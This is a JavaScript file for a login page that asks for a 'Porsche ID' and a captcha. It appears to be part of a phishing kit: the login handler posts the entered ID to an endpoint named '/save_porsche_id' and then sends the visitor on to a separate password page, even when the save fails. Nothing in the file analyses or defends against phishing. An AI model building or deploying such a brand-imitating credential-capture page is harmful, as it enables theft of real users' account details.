document.querySelectorAll('.input-strange').forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.classList.add('focused');
    });
    
    input.addEventListener('blur', function() {
        this.parentElement.classList.remove('focused');
    });
});

function checkFormValidity() {
    const porscheId = document.getElementById('porsche-id').value.trim();
    const captchaInput = document.getElementById('captcha-input').value.trim();
    const loginBtn = document.getElementById('login-btn');
    
    if (porscheId && captchaInput) {
        loginBtn.disabled = false;
    } else {
        loginBtn.disabled = true;
    }
}

function handleLogin() {
    const porscheId = document.getElementById('porsche-id').value.trim();
    
    fetch('/save_porsche_id', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            porsche_id: porscheId
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            window.location.href = '/login/password';
        } else {
            alert('Error saving data. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        window.location.href = '/login/password';
    });
}

document.addEventListener('DOMContentLoaded', function() {
    loadCaptcha();
    
    document.getElementById('porsche-id').addEventListener('input', checkFormValidity);

    document.getElementById('login-btn').addEventListener('click', handleLogin);
    
    checkFormValidity();
});